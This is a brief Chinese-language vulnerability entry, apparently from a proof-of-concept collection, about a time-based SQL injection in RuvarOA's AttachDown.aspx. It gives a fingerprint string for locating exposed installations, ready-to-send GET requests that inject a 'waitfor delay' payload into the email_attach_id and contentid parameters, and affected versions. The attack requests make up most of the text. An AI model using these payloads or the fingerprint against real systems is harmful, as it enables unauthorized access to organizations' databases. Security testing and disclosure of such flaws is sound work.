# RuvarOAAttachDown存在SQL注入漏洞

- **系统**：RuvarOAAttachDown　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /Mobile/LHMail/AttachDown.aspx?email_attach_id=1')+waitfor+delay+'0:0:3'+--+ HTTP/1.1`

**请求体 / payload**
```
poc1
Host:

poc2
GET /Mobile/LHMail/AttachDown.aspx?contentid=1')+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Host:
```

**其他**
- RuvarOA AttachDown存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01